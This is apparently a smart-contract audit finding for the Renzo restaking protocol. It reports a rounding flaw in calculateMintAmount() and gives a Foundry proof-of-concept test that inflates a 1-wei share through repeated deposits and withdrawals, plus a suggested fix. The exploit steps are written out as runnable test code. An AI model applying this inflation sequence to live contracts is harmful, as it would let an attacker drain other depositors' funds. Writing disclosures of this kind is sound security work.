# Vulnerability details

## Impact

Rounding calculations as implemented in [RenzoOracle::calculateMintAmount()](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Oracle/RenzoOracle.sol#L123-L149) may lead to unbounded inflation of initially deposited small amounts (e.g. 1 wei), allowing attackers to overtake the majority of protocol TVL by repeatedly depositing and withdrawing large amounts.

## Vulnerability Summary

Rounding calculations in [RenzoOracle::calculateMintAmount()](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Oracle/RenzoOracle.sol#L123-L149) always round with precision only up to `10**18`. Thus, an initially deposited small amount (such as 1 wei), will be translated into 1 "share" of `ezETH`. If a large amount is deposited later, which is greater than `10**18`, it will be rounded down to `10**18 - 1`, no matter the real proportion of the deposited funds.

By repeatedly depositing and withdrawing large amounts, while keeping the initial shares, the value of those shares can be inflated up to infinity.

This is only one impact of these rounding errors; other, not less severe impacts seem very plausible.

## Proof of Concept

Download [this rudimentary test suite](https://gist.github.com/codew4sp/a69da0cd6904f9fc794dac0ebe9b2ed4), and place all files into the `test` folder. Execute with `forge test --match-test InfiniteInflation`


```solidity
    function test_InfiniteInflation() public {
        // Alice deposits 1 wei initially
        vm.startPrank(alice);
        token1.approve(address(restakeManager), 1);
        restakeManager.deposit(token1, 1 );
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 1);

        vm.startPrank(bob);
        token1.approve(address(restakeManager), 1_000 * 10**18);
        restakeManager.deposit(token1, 1_000 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();

        // Now withdraw
        assertEq(ezETH.balanceOf(alice), 1);    
        assertEq(ezETH.balanceOf(bob), 999999999999999999);     

        ezETH.approve(address(withdrawQueue), 999999999999999999);
        withdrawQueue.withdraw(999999999999999999, address(token1));
        // Cooldown period passes
        vm.warp(block.timestamp + COOLDOWN_PERIOD);
        withdrawQueue.claim(0);

        vm.warp(block.timestamp + COOLDOWN_PERIOD);

        token1.approve(address(restakeManager), 1_000 * 10**18);
        restakeManager.deposit(token1, 1_000 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(ezETH.balanceOf(alice), 1);    
        assertEq(ezETH.balanceOf(bob), 499999999999999999);     
        ezETH.approve(address(withdrawQueue), 499999999999999999);
        withdrawQueue.withdraw(499999999999999999, address(token1));
        // Cooldown period passes
        vm.warp(block.timestamp + COOLDOWN_PERIOD);
        withdrawQueue.claim(0);

        token1.approve(address(restakeManager), 1_000 * 10**18);
        restakeManager.deposit(token1, 1_000 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(ezETH.balanceOf(alice), 1);    
        assertEq(ezETH.balanceOf(bob), 333333333333333332);     
        ezETH.approve(address(withdrawQueue), 333333333333333332);
        withdrawQueue.withdraw(333333333333333332, address(token1));
        // Cooldown period passes
        vm.warp(block.timestamp + COOLDOWN_PERIOD);
        withdrawQueue.claim(0);

        // Continue up to infinity; 
        // value of 1 initially deposited wei rises unbounded
    }
```


## Tools Used

Manual audit; Foundry

## Recommended Mitigation Steps

We recommend to refactor calculations in `RenzoOracle::calculateMintAmount()`, in order not to limit the precision of rounding calculations with `10**18`.
